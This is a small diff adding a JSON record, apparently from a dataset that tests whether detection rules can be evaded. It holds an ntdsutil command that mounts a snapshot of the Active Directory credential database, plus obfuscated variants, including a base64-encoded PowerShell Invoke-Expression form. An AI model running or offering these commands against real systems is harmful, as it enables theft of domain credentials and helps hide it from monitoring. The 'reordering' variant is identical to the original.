@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_ntdsutil_susp_usage_0",
+  "original_command": "\\ntdsutil.exe ntdsutil.exe snapshot mount ac i ntds",
+  "evasions": {
+    "insertion": "\\ntdsutil.exe ntdsutil.exe \\\"s\\\"\\\"n\\\"\\\"a\\\"\\\"p\\\"\\\"s\\\"\\\"h\\\"\\\"o\\\"\\\"t\\\" mount ac i ntds",
+    "substitution": "\\ntdsutil.exe ntdsutil.exe snapshot mount ac i ntds #substitution",
+    "omission": "\\ntdsutil ntdsutil snapshot mount ac i ntds",
+    "reordering": "\\ntdsutil.exe ntdsutil.exe snapshot mount ac i ntds",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XG50ZHN1dGlsLmV4ZSBudGRzdXRpbC5leGUgc25hcHNob3QgbW91bnQgYWMgaSBudGRz')) | Invoke-Expression\" "
+  }
+}
